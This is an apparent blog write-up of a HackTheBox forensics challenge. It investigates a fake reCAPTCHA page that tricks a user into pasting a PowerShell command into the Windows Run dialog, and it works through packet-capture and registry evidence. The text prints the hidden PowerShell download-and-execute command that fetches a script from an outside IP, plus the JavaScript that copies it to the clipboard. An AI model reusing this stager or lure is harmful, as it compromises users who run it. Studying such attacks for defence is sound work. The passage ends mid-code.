---
title: HTB Sherlock: Pikaptcha
url: https://0xdf.gitlab.io/2024/10/22/htb-sherlock-pikaptcha.html
date: 2024-10-22T21:23:05+00:00
difficulty: Easy
tags: htb-sherlock, ctf, hackthebox, dfir, forensics, sherlock-pikaptcha, registry-explorer, wireshark, captcha, social-engineering, runmru
---

![Pikaptcha](/icons/sherlock-pikaptcha.png)

I’m given a PCAP and file artifacts from a compromised computer. This user claims to have gone through a fake download including a captcha. The attack turns out to be a malicious captcha that manipulates the user into running a PowerShell command via the Windows run dialoag, an attack became common in September 2024. I’ll look at the PCAP and the user’s RunMRU registry key to get details about the attack.

## Challenge Info

| Name | [Pikaptcha](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fpikaptcha)  [Pikaptcha](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fpikaptcha) [Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fpikaptcha) |
| --- | --- |
| Release Date | 22 October 2024 |
| Retire Date | 22 October 2024 |
| Difficulty | Easy |
| Category | DFIR DFIR |
| Creator | [CyberJunkie CyberJunkie](https://app.hackthebox.com/users/468989) |

## Background

### Scenario

> Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack.
> You are provided with network traffic and endpoint artifacts to answer questions about what happened.

Notes from the scenario:
- There’s a phishing email to Happy Grunwald.
- Mentions a captcha.
- Will have network traffic and local collection.
- I immediately think of when this hit the infosec new last month:

  > cc [@github](https://twitter.com/github?ref_src=twsrc%5Etfw) [@GitHubSecurity](https://twitter.com/GitHubSecurity?ref_src=twsrc%5Etfw) this mass issue creation campaign looks to be actively ongoing as of a few minutes ago. flood of new bot accounts. site leads to copy-paste CAPTCHA scam, looks like a mix of the original lummastealer lure and my poc (so, uh, sorry) <https://t.co/tu2IUk7VsE> [pic.twitter.com/6eBo2UsYaz](https://t.co/6eBo2UsYaz)
  >
  > — John Hammond (@\_JohnHammond) [September 18, 2024](https://twitter.com/_JohnHammond/status/1836484080504049692?ref_src=twsrc%5Etfw)

### Questions

To solve this challenge, I’ll need to answer the following 6 questions:
1. It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.
2. At what time in UTC did the malicious payload execute?
3. The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?
4. To which port did the reverse shell connect?
5. For how many seconds was the reverse shell connection established between C2 and the victim’s workstation?
6. Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim’s clipboard?

### Data

The download has two files in it:

```

oxdf@hacky$ unzip -l Pikaptcha.zip 
Archive:  Pikaptcha.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2024-09-23 10:24   Pikaptcha/
 39484386  2024-09-23 10:22   Pikaptcha/2024-09-23T052209_alert_mssp_action.zip
494106428  2024-09-23 10:14   Pikaptcha/pikaptcha.pcapng
---------                     -------
533590814                     3 files

```

There’s a PCAP network capture file, as well as another zip archive. The second zip shows 250 files / directories:

```

oxdf@hacky$ unzip -l 2024-09-23T052209_alert_mssp_action.zip
Archive:  2024-09-23T052209_alert_mssp_action.zip
Created by KAPE version 1.3.0.2 on 2024-09-23T05:22:09.5720380Z
  Length      Date    Time    Name
---------  ---------- -----   ----
    69491  2024-09-23 10:22   2024-09-23T05_22_09_5720380_CopyLog.csv
      624  2024-09-23 10:22   2024-09-23T05_22_09_5720380_SkipLog.csv.csv
        0  2024-09-23 10:22   C/
        0  2024-09-23 10:22   C/Users/
   786432  2024-09-23 10:17   C/Users/Administrator/NTUSER.DAT
    73728  2023-03-08 16:22   C/Users/Administrator/ntuser.dat.LOG1
        0  2023-03-08 16:22   C/Users/Administrator/ntuser.dat.LOG2
        0  2024-09-23 10:22   C/Users/Administrator/AppData/
        0  2024-09-23 10:22   C/Users/Administrator/AppData/Local/
        0  2024-09-23 10:22   C/Users/Administrator/AppData/Local/Microsoft/
  1572864  2024-09-23 10:17   C/Users/Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat
    81920  2023-03-08 16:22   C/Users/Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG1
   419840  2023-03-08 16:22   C/Users/Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG2
  1048576  2024-09-23 10:17   C/Users/CyberJunkie/NTUSER.DAT
   163840  2023-03-07 18:12   C/Users/CyberJunkie/ntuser.dat.LOG1
   258048  2023-03-07 18:12   C/Users/CyberJunkie/ntuser.dat.LOG2
        0  2024-09-23 10:22   C/Users/CyberJunkie/AppData/
        0  2024-09-23 10:22   C/Users/CyberJunkie/AppData/Local/
        0  2024-09-23 10:22   C/Users/CyberJunkie/AppData/Local/Microsoft/
  2883584  2024-09-23 10:17   C/Users/CyberJunkie/AppData/Local/Microsoft/Windows/UsrClass.dat
    61440  2023-03-07 18:12   C/Users/CyberJunkie/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG1
   736256  2023-03-07 18:12   C/Users/CyberJunkie/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG2
   262144  2024-09-23 10:17   C/Users/Default/NTUSER.DAT
    45056  2019-12-07 14:03   C/Users/Default/NTUSER.DAT.LOG1
    20480  2019-12-07 14:03   C/Users/Default/NTUSER.DAT.LOG2
        0  2024-09-23 10:22   C/Users/Default/AppData/
        0  2024-09-23 10:22   C/Users/Default/AppData/Local/
        0  2024-09-23 10:22   C/Users/Default/AppData/Local/Microsoft/
     8192  2024-09-23 10:03   C/Users/Default/AppData/Local/Microsoft/Windows/UsrClass.dat
     8192  2023-03-10 09:04   C/Users/Default/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG1
     8192  2023-03-10 09:04   C/Users/Default/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG2
   524288  2023-03-07 18:02   C/Users/defaultuser0/NTUSER.DAT
        0  2024-09-23 10:22   C/Users/defaultuser0/AppData/
        0  2024-09-23 10:22   C/Users/defaultuser0/AppData/Local/
        0  2024-09-23 10:22   C/Users/defaultuser0/AppData/Local/Microsoft/
   524288  2023-03-07 18:02   C/Users/defaultuser0/AppData/Local/Microsoft/Windows/UsrClass.dat
   131072  2023-03-07 17:51   C/Users/defaultuser0/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG2
  1310720  2023-03-09 18:39   C/Users/happy.grunwald/NTUSER.DAT
   389120  2023-03-08 16:19   C/Users/happy.grunwald/ntuser.dat.LOG1
   361472  2023-03-08 16:19   C/Users/happy.grunwald/ntuser.dat.LOG2
        0  2024-09-23 10:22   C/Users/happy.grunwald/AppData/
        0  2024-09-23 10:22   C/Users/happy.grunwald/AppData/Local/
        0  2024-09-23 10:22   C/Users/happy.grunwald/AppData/Local/Microsoft/
  2359296  2023-03-09 18:39   C/Users/happy.grunwald/AppData/Local/Microsoft/Windows/UsrClass.dat
  1064960  2023-03-08 16:19   C/Users/happy.grunwald/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG1
   327680  2023-03-08 16:19   C/Users/happy.grunwald/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG2
        0  2024-09-23 10:22   C/Windows/
     7392  2023-03-09 14:22   C/Windows/prefetch/ACE2016-KB5002138-FULLFILE-X6-F6B4ABCD.pf
    14417  2024-09-23 10:03   C/Windows/prefetch/APPLICATIONFRAMEHOST.EXE-8CE9A1EE.pf
     6015  2024-09-23 10:10   C/Windows/prefetch/AUDIODG.EXE-AB22E9A6.pf
    18120  2024-09-23 10:17   C/Windows/prefetch/BACKGROUNDTASKHOST.EXE-05A8BF9D.pf
    17896  2024-09-23 10:05   C/Windows/prefetch/BACKGROUNDTASKHOST.EXE-256D666C.pf
     2382  2024-09-23 10:13   C/Windows/prefetch/COMPATTELRUNNER.EXE-B7A68ECC.pf
     7675  2024-09-23 10:19   C/Windows/prefetch/CONHOST.EXE-0C6456FB.pf
    49458  2023-03-10 09:04   C/Windows/prefetch/CONSENT.EXE-40419367.pf
     3614  2024-09-23 10:17   C/Windows/prefetch/DLLHOST.EXE-1BAE06BB.pf
     8403  2024-09-23 10:17   C/Windows/prefetch/DLLHOST.EXE-47BE07DC.pf
     5316  2024-09-23 10:03   C/Windows/prefetch/DLLHOST.EXE-7617EDA2.pf
     3691  2024-09-23 10:19   C/Windows/prefetch/DLLHOST.EXE-7D5CE0CA.pf
    12128  2023-03-08 16:05   C/Windows/prefetch/DLLHOST.EXE-8EE3ADE8.pf
    10741  2023-03-08 16:04   C/Windows/prefetch/DLLHOST.EXE-F144D205.pf
     4402  2024-09-23 10:03   C/Windows/prefetch/DLLHOST.EXE-F7FC6593.pf
    20387  2023-03-09 18:17   C/Windows/prefetch/DWM.EXE-314E93C5.pf
    65347  2023-03-08 16:04   C/Windows/prefetch/EXPLORER.EXE-D5E97654.pf
     7253  2024-09-23 10:10   C/Windows/prefetch/FILECOAUTH.EXE-4702AC91.pf
     8617  2024-09-23 10:17   C/Windows/prefetch/FILESYNCCONFIG.EXE-EA7B43AD.pf
     5841  2023-03-09 18:18   C/Windows/prefetch/FIREFOX INSTALLER.EXE-13A26B52.pf
    65133  2024-09-23 10:05   C/Windows/prefetch/FIREFOX.EXE-66015FD1.pf
    45335  2024-09-23 10:19   C/Windows/prefetch/GKAPE.EXE-CEBBB30A.pf
     2625  2024-09-23 10:02   C/Windows/prefetch/GPUPDATE.EXE-7EBA4B6F.pf
     2273  2024-09-23 10:12   C/Windows/prefetch/IPCONFIG.EXE-BFEC2AD0.pf
    29755  2023-03-10 09:04   C/Windows/prefetch/KMS_VL_ALL_AIO.EXE-DEC1136B.pf
    38504  2023-03-08 16:24   C/Windows/prefetch/LOGONUI.EXE-F639BD7E.pf
     9258  2024-09-23 10:05   C/Windows/prefetch/MAINTENANCESERVICE.EXE-9596E406.pf
    32846  2023-03-10 09:03   C/Windows/prefetch/MICROSOFT OFFICE 2021 PRO PLU-A4822CF7.pf
    18709  2024-09-23 10:17   C/Windows/prefetch/MICROSOFT.SHAREPOINT.EXE-B6192A2B.pf
     4904  2024-09-23 10:04   C/Windows/prefetch/MICROSOFTEDGEUPDATE.EXE-6B0998E6.pf
     7084  2024-09-23 10:18   C/Windows/prefetch/MICROSOFTEDGEUPDATE.EXE-7A595326.pf
     9984  2024-09-23 10:04   C/Windows/prefetch/MICROSOFTEDGEUPDATESETUP_X86_-62890F32.pf
    40501  2023-03-09 15:06   C/Windows/prefetch/MMC.EXE-1EE19326.pf
    33295  2023-03-08 16:33   C/Windows/prefetch/MMC.EXE-8F0FB2DD.pf
    54278  2023-03-09 15:06   C/Windows/prefetch/MMC.EXE-F964DB0C.pf
     7170  2024-09-23 10:17   C/Windows/prefetch/MOBSYNC.EXE-B307E1CC.pf
    14180  2024-09-23 10:17   C/Windows/prefetch/MOUSOCOREWORKER.EXE-4429AC2B.pf
     5925  2024-09-23 10:19   C/Windows/prefetch/MPCMDRUN.EXE-2C9109F9.pf
    14992  2024-09-23 10:12   C/Windows/prefetch/MSCORSVW.EXE-16B291C4.pf
    15466  2024-09-23 10:12   C/Windows/prefetch/MSCORSVW.EXE-8CE1A322.pf
    56718  2023-03-09 18:17   C/Windows/prefetch/MSEDGE.EXE-37D25F9A.pf
    55204  2024-09-23 10:17   C/Windows/prefetch/MSEDGE.EXE-37D25F9F.pf
     8304  2024-09-23 10:12   C/Windows/prefetch/MSIEXEC.EXE-8FFB1633.pf
    17427  2023-03-10 09:04   C/Windows/prefetch/MSIEXEC.EXE-CDBFC0F7.pf
     5645  2024-09-23 10:12   C/Windows/prefetch/NGEN.EXE-4A8DA13E.pf
    14469  2024-09-23 10:12   C/Windows/prefetch/NGEN.EXE-734C6620.pf
    12871  2024-09-23 10:12   C/Windows/prefetch/NGENTASK.EXE-0E6CEC17.pf
    11344  2024-09-23 10:12   C/Windows/prefetch/NGENTASK.EXE-849BFD75.pf
    25601  2023-03-10 09:03   C/Windows/prefetch/OFFICEC2RCLIENT.EXE-6DB2EFE8.pf
    12450  2024-09-23 10:09   C/Windows/prefetch/OFFICECLICKTORUN.EXE-AAFF49A9.pf
    42079  2023-03-10 09:03   C/Windows/prefetch/OFFICECLICKTORUN.EXE-F5CCE208.pf
    41400  2023-03-08 16:23   C/Windows/prefetch/ONEDRIVE.EXE-05361D4F.pf
    51285  2023-03-08 15:14   C/Windows/prefetch/ONEDRIVE.EXE-191F0739.pf
   105424  2023-03-10 08:14   C/Windows/prefetch/ONEDRIVE.EXE-267427AE.pf
    14712  2024-09-23 10:17   C/Windows/prefetch/ONEDRIVE.EXE-ADAA7004.pf
    61547  2024-09-23 10:17   C/Windows/prefetch/ONEDRIVE.EXE-B657FF91.pf
    30992  2024-09-23 10:17   C/Windows/prefetch/ONEDRIVESETUP.EXE-3A6C78CC.pf
     2890  2023-03-09 18:17   C/Windows/prefetch/Op-MSEDGE.EXE-37D25F9A-00000001.pf
    19811  2023-03-09 15:08   C/Windows/prefetch/OPENWITH.EXE-8B50D58B.pf
    10425  2024-09-23 10:08   C/Windows/prefetch/PINGSENDER.EXE-B4914655.pf
    38574  2024-09-23 10:07   C/Windows/prefetch/POWERSHELL.EXE-CA1AE517.pf
     5235  2024-09-23 10:17   C/Windows/prefetch/REGSVR32.EXE-03D3FB87.pf
     5706  2024-09-23 10:17   C/Windows/prefetch/REGSVR32.EXE-B31EC963.pf
     4780  2024-09-23 10:02   C/Windows/prefetch/RUNDLL32.EXE-36D847E4.pf
     3318  2024-09-23 10:19   C/Windows/prefetch/RUNDLL32.EXE-75313621.pf
     9641  2024-09-23 10:17   C/Windows/prefetch/RUNONCE.EXE-FB4EF753.pf
     8432  2024-09-23 10:16   C/Windows/prefetch/RUNTIMEBROKER.EXE-3F7C1099.pf
     9739  2024-09-23 10:17   C/Windows/prefetch/RUNTIMEBROKER.EXE-4551A062.pf
    16383  2024-09-23 10:16   C/Windows/prefetch/RUNTIMEBROKER.EXE-6B83017D.pf
     9413  2024-09-23 10:18   C/Windows/prefetch/RUNTIMEBROKER.EXE-B99D7653.pf
     3936  2024-09-23 10:03   C/Windows/prefetch/SCHTASKS.EXE-8B6144A9.pf
    60262  2023-03-10 09:02   C/Windows/prefetch/SEARCHAPP.EXE-0848CA88.pf
    35244  2023-03-07 18:14   C/Windows/prefetch/SEARCHAPP.EXE-52924D3F.pf
    96638  2024-09-23 10:16   C/Windows/prefetch/SEARCHAPP.EXE-86067E5D.pf
     4042  2024-09-23 10:19   C/Windows/prefetch/SEARCHFILTERHOST.EXE-44162447.pf
    22543  2024-09-23 10:16   C/Windows/prefetch/SEARCHINDEXER.EXE-1CF42BC6.pf
     4730  2024-09-23 10:16   C/Windows/prefetch/SEARCHPROTOCOLHOST.EXE-69C456C3.pf
    28147  2023-03-08 16:24   C/Windows/prefetch/SECHEALTHUI.EXE-FAB65C18.pf
     4721  2023-03-08 16:24   C/Windows/prefetch/SECURITYHEALTHHOST.EXE-06344EE9.pf
     9506  2024-09-23 10:17   C/Windows/prefetch/SECURITYHEALTHSERVICE.EXE-91B5FB98.pf
     5370  2024-09-23 10:17   C/Windows/prefetch/SECURITYHEALTHSYSTRAY.EXE-E527A4AE.pf
     3367  2023-03-08 16:24   C/Windows/prefetch/SETHC.EXE-1E0D0DA0.pf
     6384  2023-03-08 16:23   C/Windows/prefetch/SETTINGSYNCHOST.EXE-0130E42A.pf
    40439  2023-03-09 18:18   C/Windows/prefetch/SETUP-STUB.EXE-BC55E5D8.pf
    34704  2023-03-10 09:03   C/Windows/prefetch/SETUP.EXE-2E3AFC99.pf
    22205  2023-03-09 18:18   C/Windows/prefetch/SETUP.EXE-B976C6D1.pf
    47024  2023-03-07 23:42   C/Windows/prefetch/SETUP64.EXE-6C6157AB.pf
     3845  2023-03-08 14:40   C/Windows/prefetch/SFC.EXE-425529A1.pf
     2766  2024-09-23 10:18   C/Windows/prefetch/SGRMBROKER.EXE-32481FEB.pf
    40048  2024-09-23 10:18   C/Windows/prefetch/SHELLEXPERIENCEHOST.EXE-B3EF1F80.pf
    16224  2024-09-23 10:03   C/Windows/prefetch/SIHCLIENT.EXE-98C47F6C.pf
    17037  2023-03-10 08:13   C/Windows/prefetch/SIHOST.EXE-115B507F.pf
     8533  2024-09-23 10:03   C/Windows/prefetch/SLUI.EXE-3E441AEE.pf
    17524  2024-09-23 10:17   C/Windows/prefetch/SMARTSCREEN.EXE-EACC1250.pf
     1853  2023-03-08 16:22   C/Windows/prefetch/SMSS.EXE-B5B810DB.pf
     6350  2023-03-10 09:05   C/Windows/prefetch/SPPEXTCOMOBJ.EXE-7D45A1AB.pf
    11672  2024-09-23 10:17   C/Windows/prefetch/SPPSVC.EXE-96070FE0.pf
    14337  2024-09-23 10:17   C/Windows/prefetch/SQUIRREL.EXE-C74CA7BE.pf
    62185  2024-09-23 10:16   C/Windows/prefetch/STARTMENUEXPERIENCEHOST.EXE-DF593AF9.pf
     8407  2024-09-23 10:03   C/Windows/prefetch/SVCHOST.EXE-09F4AEA4.pf
     6383  2023-03-09 18:17   C/Windows/prefetch/SVCHOST.EXE-117C4441.pf
     5290  2023-03-07 19:21   C/Windows/prefetch/SVCHOST.EXE-12266D0E.pf
     3152  2023-03-10 09:04   C/Windows/prefetch/SVCHOST.EXE-1454AA18.pf
    14631  2024-09-23 10:06   C/Windows/prefetch/SVCHOST.EXE-19B557B1.pf
     3072  2023-03-08 15:46   C/Windows/prefetch/SVCHOST.EXE-1B73F444.pf
     3714  2023-03-10 08:13   C/Windows/prefetch/SVCHOST.EXE-44C0CDF7.pf
     4837  2023-03-07 23:42   C/Windows/prefetch/SVCHOST.EXE-467B6557.pf
     6838  2024-09-23 10:12   C/Windows/prefetch/SVCHOST.EXE-4B98D760.pf
     7956  2024-09-23 10:18   C/Windows/prefetch/SVCHOST.EXE-4BD0A607.pf
     7363  2023-03-08 16:04   C/Windows/prefetch/SVCHOST.EXE-4E79CC0D.pf
     5577  2023-03-10 09:02   C/Windows/prefetch/SVCHOST.EXE-4FBD1216.pf
     4193  2023-03-08 16:17   C/Windows/prefetch/SVCHOST.EXE-529F9AC1.pf
    13406  2023-03-10 08:48   C/Windows/prefetch/SVCHOST.EXE-59780EBF.pf
    23965  2023-03-08 15:15   C/Windows/prefetch/SVCHOST.EXE-59D511F9.pf
    20762  2023-03-10 08:13   C/Windows/prefetch/SVCHOST.EXE-6493017E.pf
     6715  2023-03-10 08:24   C/Windows/prefetch/SVCHOST.EXE-6867B1E5.pf
    45698  2024-09-23 10:12   C/Windows/prefetch/SVCHOST.EXE-6A4A44E7.pf
     6168  2023-03-09 18:17   C/Windows/prefetch/SVCHOST.EXE-73A7D02B.pf
    11933  2023-03-10 09:05   C/Windows/prefetch/SVCHOST.EXE-73D024B2.pf
    12730  2024-09-23 10:17   C/Windows/prefetch/SVCHOST.EXE-764FA25C.pf
     5241  2023-03-10 07:10   C/Windows/prefetch/SVCHOST.EXE-77C41F85.pf
    12965  2023-03-08 16:46   C/Windows/prefetch/SVCHOST.EXE-7AAD9645.pf
    10393  2023-03-10 09:04   C/Windows/prefetch/SVCHOST.EXE-84F32335.pf
     6186  2023-03-10 09:03   C/Windows/prefetch/SVCHOST.EXE-852EC587.pf
     3991  2023-03-09 15:09   C/Windows/prefetch/SVCHOST.EXE-8F09AACB.pf
     4767  2024-09-23 10:17   C/Windows/prefetch/SVCHOST.EXE-952637C2.pf
     4268  2024-09-23 10:20   C/Windows/prefetch/SVCHOST.EXE-9A28EB78.pf
     4902  2024-09-23 10:17   C/Windows/prefetch/SVCHOST.EXE-A79A44A2.pf
     8379  2024-09-23 10:03   C/Windows/prefetch/SVCHOST.EXE-B18C213B.pf
     7913  2024-09-23 10:20   C/Windows/prefetch/SVCHOST.EXE-C25BD44A.pf
     5044  2024-09-23 10:18   C/Windows/prefetch/SVCHOST.EXE-C38EF8DD.pf
     3337  2024-09-23 10:16   C/Windows/prefetch/SVCHOST.EXE-D4A56B1A.pf
     5861  2024-09-23 10:03   C/Windows/prefetch/SVCHOST.EXE-EA46708B.pf
     3035  2024-09-23 10:18   C/Windows/prefetch/SVCHOST.EXE-EBBF67E6.pf
     6968  2024-09-23 10:17   C/Windows/prefetch/SVCHOST.EXE-F5E1DCD3.pf
     9531  2023-03-08 13:17   C/Windows/prefetch/SYSTEMPROPERTIESADVANCED.EXE-27792BE5.pf
     9221  2023-03-08 13:25   C/Windows/prefetch/SYSTEMPROPERTIESCOMPUTERNAME.-449B662F.pf
    64318  2024-09-23 10:03   C/Windows/prefetch/SYSTEMSETTINGS.EXE-BE0858C5.pf
    24923  2023-03-08 16:17   C/Windows/prefetch/SYSTEMSETTINGSADMINFLOWS.EXE-F74198E7.pf
    21801  2024-09-23 10:19   C/Windows/prefetch/TASKHOSTW.EXE-2E5D4B75.pf
    22618  2023-03-08 16:28   C/Windows/prefetch/TASKMGR.EXE-4C8500BA.pf
    52594  2024-09-23 10:17   C/Windows/prefetch/TEAMS.EXE-090B503D.pf
    16791  2024-09-23 10:17   C/Windows/prefetch/TEAMS.EXE-090B503E.pf
    13978  2024-09-23 10:19   C/Windows/prefetch/TEAMS.EXE-090B503F.pf
    10236  2024-09-23 10:17   C/Windows/prefetch/TEAMS.EXE-090B5045.pf
    20363  2023-03-07 18:14   C/Windows/prefetch/TEXTINPUTHOST.EXE-BA8181DE.pf
    32256  2024-09-23 10:17   C/Windows/prefetch/TEXTINPUTHOST.EXE-CAB6150D.pf
     4489  2024-09-23 10:12   C/Windows/prefetch/TRUSTEDINSTALLER.EXE-766EFF52.pf
     3722  2024-09-23 10:18   C/Windows/prefetch/UHSSVC.EXE-24338E2F.pf
     7827  2024-09-23 10:12   C/Windows/prefetch/UNIFIEDINSTALLER.EXE-4C6C1CCA.pf
     8417  2023-03-09 14:29   C/Windows/prefetch/UNINSTALL.EXE-73AE4314.pf
    36772  2024-09-23 10:17   C/Windows/prefetch/UPDATE.EXE-7F91DD4C.pf
    24529  2024-09-23 10:17   C/Windows/prefetch/UPDATE.EXE-A0EA6CFF.pf
    39363  2024-09-23 10:05   C/Windows/prefetch/UPDATER.EXE-88336796.pf
     4654  2024-09-23 10:05   C/Windows/prefetch/UPDATER.EXE-A602B903.pf
     4103  2024-09-23 10:03   C/Windows/prefetch/UPFC.EXE-89D4FAEB.pf
     7794  2024-09-23 10:10   C/Windows/prefetch/USEROOBEBROKER.EXE-65584ADF.pf
    23166  2023-03-07 23:42   C/Windows/prefetch/VCREDIST_X64.EXE-D5DBE3C6.pf
    23669  2023-03-07 23:42   C/Windows/prefetch/VCREDIST_X86.EXE-A6BFCA90.pf
    12730  2023-03-07 23:42   C/Windows/prefetch/VC_REDIST.X64.EXE-2F3BF276.pf
    12936  2023-03-07 23:42   C/Windows/prefetch/VC_REDIST.X86.EXE-5177144C.pf
    13365  2024-09-23 10:17   C/Windows/prefetch/VMTOOLSD.EXE-90328040.pf
     4754  2024-09-23 10:12   C/Windows/prefetch/VSSVC.EXE-6C8F0C66.pf
    15688  2024-09-23 10:03   C/Windows/prefetch/WAASMEDICAGENT.EXE-F5A0D296.pf
     3049  2024-09-23 10:08   C/Windows/prefetch/WHOAMI.EXE-9D378AFE.pf
    35416  2023-03-09 14:29   C/Windows/prefetch/WINRAR-X64-621.EXE-C833BA3D.pf
    48081  2024-09-23 10:19   C/Windows/prefetch/WINRAR.EXE-BA8CDB31.pf
    50920  2023-03-10 09:05   C/Windows/prefetch/WINWORD.EXE-AB6EC2FA.pf
     5200  2024-09-23 10:20   C/Windows/prefetch/WMIADAP.EXE-BB21CD77.pf
     4659  2024-09-23 10:18   C/Windows/prefetch/WMIAPSRV.EXE-FC8436DD.pf
    13821  2024-09-23 10:03   C/Windows/prefetch/WMIPRVSE.EXE-E8B8DD29.pf
    15937  2024-09-23 10:12   C/Windows/prefetch/WUAUCLT.EXE-5D573F0E.pf
    52711  2023-03-08 16:17   C/Windows/prefetch/WWAHOST.EXE-2CFA09D4.pf
        0  2024-09-23 10:22   C/Windows/ServiceProfiles/
    16384  2024-09-23 10:16   C/Windows/ServiceProfiles/LocalService/NTUSER.DAT
    32768  2023-03-07 23:44   C/Windows/ServiceProfiles/LocalService/NTUSER.DAT.LOG1
    49152  2023-03-07 23:44   C/Windows/ServiceProfiles/LocalService/NTUSER.DAT.LOG2
   524288  2024-09-23 10:16   C/Windows/ServiceProfiles/NetworkService/NTUSER.DAT
   155648  2023-03-07 19:06   C/Windows/ServiceProfiles/NetworkService/NTUSER.DAT.LOG1
        0  2024-09-23 10:22   C/Windows/System32/
   524288  2024-09-23 10:16   C/Windows/System32/config/DEFAULT
   286720  2019-12-07 14:03   C/Windows/System32/config/DEFAULT.LOG1
   233472  2019-12-07 14:03   C/Windows/System32/config/DEFAULT.LOG2
    65536  2024-09-23 10:16   C/Windows/System32/config/SAM
    65536  2019-12-07 14:03   C/Windows/System32/config/SAM.LOG1
    32768  2019-12-07 14:03   C/Windows/System32/config/SAM.LOG2
    32768  2024-09-23 10:16   C/Windows/System32/config/SECURITY
    86016  2019-12-07 14:03   C/Windows/System32/config/SECURITY.LOG1
 86245376  2024-09-23 10:16   C/Windows/System32/config/SOFTWARE
 27897856  2019-12-07 14:03   C/Windows/System32/config/SOFTWARE.LOG1
 21601280  2019-12-07 14:03   C/Windows/System32/config/SOFTWARE.LOG2
 13631488  2024-09-23 10:16   C/Windows/System32/config/SYSTEM
  5857280  2019-12-07 14:03   C/Windows/System32/config/SYSTEM.LOG1
  3039232  2019-12-07 14:03   C/Windows/System32/config/SYSTEM.LOG2
     8192  2024-09-23 10:18   C/Windows/System32/SRU/SRU.chk
    65536  2024-09-23 10:18   C/Windows/System32/SRU/SRU.log
    65536  2023-03-10 09:01   C/Windows/System32/SRU/SRU0004E.log
    65536  2023-03-10 09:01   C/Windows/System32/SRU/SRU0004F.log
    65536  2024-09-23 10:15   C/Windows/System32/SRU/SRU00050.log
  3735552  2024-09-23 10:18   C/Windows/System32/SRU/SRUDB.dat
    16384  2024-09-23 10:18   C/Windows/System32/SRU/SRUDB.jfm
    65536  2023-03-07 18:12   C/Windows/System32/SRU/SRUres00001.jrs
    65536  2023-03-10 09:01   C/Windows/System32/SRU/SRUtmp.log
---------                     -------
183200204                     250 files

```

It includes home directories, prefetch datra, and `System32`.

### Tools

I’ll use [Registry Explorer](https://ericzimmerman.github.io/#!index.md) (another Eric Zimmerman tool) to look at registry hives from the system. This is a Windows only tool, but I don’t know of a really nice Linux tool for this job.

I’ll use [Wireshark](https://www.wireshark.org/) to look at the PCAP data.

## Results

### PCAP Analysis

Given the mention of the web interaction, I’ll start with the PCAP.

#### Statistics

After opening the file in Wireshark, Statistics –> Protocol Hierarchy shows that I’m mostly looking at IPv4 / TCP / HTTP traffic:

[![image-20241021141326239](/img/image-20241021141326239.png)*Click for full size image*](/img/image-20241021141326239.png)

Statistics –> Endpoints shows 123 IPv4 endpoints. I’ll sort by bytes to look for the target host:

![image-20241021141440955](/img/image-20241021141440955.png)

There’s two 172.17.79.0/24 addresses towards the top.

#### Files

Under Files –> Export Objects –> HTTP it lists the files downloaded over HTTP:

[![image-20241021141747369](/img/image-20241021141747369.png)*Click for full size image*](/img/image-20241021141747369.png)

There’s a lot here. I’ll poke at some keywords to filter on, and when I try “office” (from the scenario), there’s an interesting match:

[![image-20241021141923330](/img/image-20241021141923330.png)*Click for full size image*](/img/image-20241021141923330.png)

I’ll save that file.

#### Download

I’ll filter on `ip.addr=43.205.115.44` and find the GET request for `office2024install.ps1`:

[![image-20241021142520826](/img/image-20241021142520826.png)*Click for full size image*](/img/image-20241021142520826.png)

The GET and response both come at 5:07:47 on 23 September 2024:

![image-20241021142557986](/img/image-20241021142557986.png)

At 2024-09-23 05:07:47 Windows requested this file. This is not the answer to Task 2, as that task asks about the time it was executed, rather than downloaded. I’ll show later that the malicious command was executed, resulting in this download request a couple seconds later.

### Captcha Attack

#### Webpage

The download of `office2024install.ps1` comes from 43.205.115.44. I’ll look at other HTTP requests leading up to that with `ip.addr==43.205.115.44 and http` as a filter in Wireshark:

[![image-20241021144240400](/img/image-20241021144240400.png)*Click for full size image*](/img/image-20241021144240400.png)

I’ll look at the `GET /` at 05:06:15. The page title is “reCAPTCHA Verification”:

![image-20241021144406415](/img/image-20241021144406415.png)

All the CSS is inline, so I can save the HTML to a file and open it, showing a standard Google reCAPTCHA page:

![image-20241021144553206](/img/image-20241021144553206.png)

On clicking, it shows:

![image-20241021144614883](/img/image-20241021144614883.png)

#### Captcha Attack

This attack was publicly exposed in September 2024. When the user clicks the “I’m not a robot” bot, a PowerShell command is copies to their clipboard (Task 1):

```

powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"

```

Then the instruction say:
- Windows key + R, which opens the “Run” dialog:

  ![image-20241021145219157](/img/image-20241021145219157.png)

</picture>
- Ctrl + V - Paste in the PowerShell
- Enter - Run the PowerShell.

#### HTML Source

Looking more closely, at the bottom of the HTML source is in-line JavaScript. There’s a function that handles setting the clipboard:

```

   function setClipboardCopyData(textToCopy){
        const tempTextArea = document.createElement("textarea");
        tempTextArea.value = textToCopy;
        document.body.append(tempTextArea);
        tempTextArea.select();
        document.execCommand("copy");
        document.body.removeChild(tempTextArea);
    }

```

Another that calls that function to write the payload to the clipboard (Task 6):

```

    function stageClipboard(commandToRun, verification_id){
